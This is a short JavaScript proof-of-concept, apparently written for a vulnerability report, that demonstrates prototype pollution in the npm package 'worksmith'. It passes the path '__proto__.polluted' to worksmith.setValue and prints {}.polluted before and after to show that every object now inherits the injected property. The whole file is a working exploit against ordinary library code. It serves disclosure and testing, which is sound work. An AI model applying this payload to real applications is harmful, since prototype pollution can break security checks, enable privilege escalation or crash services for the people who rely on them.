var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const worksmith = require('worksmith');
obj = {};
console.log({}.polluted);
worksmith.setValue(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);